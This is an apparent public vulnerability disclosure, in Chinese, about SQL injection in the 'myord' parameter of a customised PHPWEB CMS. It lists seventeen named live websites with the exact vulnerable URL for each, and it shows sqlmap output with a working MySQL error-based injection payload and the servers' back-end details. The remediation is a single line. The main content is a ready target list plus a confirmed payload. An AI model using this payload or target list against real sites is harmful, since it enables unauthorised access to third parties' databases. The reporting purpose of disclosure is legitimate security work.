wybug_title: 某建站系统通用SQL注射漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-10-17：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-01-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 123 详细说明：  #1.互维网络（http://www.s88c.com/）二次开发的PHPWEB CMS程序用于多数网站，并且存在同一注入漏洞他是二次开发 PHPwebCMS系统。没有严格的过滤导致SQL注射。看下这么多案例。http://www.yndht.com/news/class/index.php?myord=1http://www.kmxkgc.com/news/class/index.php?myord=1http://www.kmynf.com/news/class/index.php?myord=1http://www.kefuan.com/news/class/index.php?myord=1http://kmzhiyang.com/news/class/index.php?myord=1http://www.yndimai.com/news/class/index.php?myord=1http://www.ynyuntong.com/news/class/index.php?myord=1http://www.123shuxue.com/news/class/index.php?myord=1http://www.ynchengtai.com/news/class/index.php?myord=1http://www.nvshendong.com/news/class/index.php?myord=1http://kmdbjd.com/news/class/index.php?myord=1http://昆明公司注册.com/news/class/index.php?myord=1http://www.kmjunding.com/news/class/index.php?myord=1http://wkrhy.com/news/class/index.php?myord=1http://www.ynbkhb.com/news/class/index.php?myord=1http://www.ynquanlan.com/news/class/index.php?myord=1http://qjkld.com/news/class/index.php?myord=1   漏洞证明：  测试下每个连接,我们看图如下。
GET parameter 'myord' is vulnerable. Do you want to keep testing the others (ifany)? [y/N] Nsqlmap identified the following injection points with a total of 72 HTTP(s) requests:---Place: GETParameter: myord    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: myord=1 AND (SELECT 5498 FROM(SELECT COUNT(*),CONCAT(0x7177777671,(SELECT (CASE WHEN (5498=5498) THEN 1 ELSE 0 END)),0x716f6a7771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---[21:31:55] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5.0[21:31:55] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\qjkld.com'
有WAF。



都是存在注入的。我也深入测试了。   修复方案：  过滤参数、   版权声明：转载请注明来源 老和尚@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
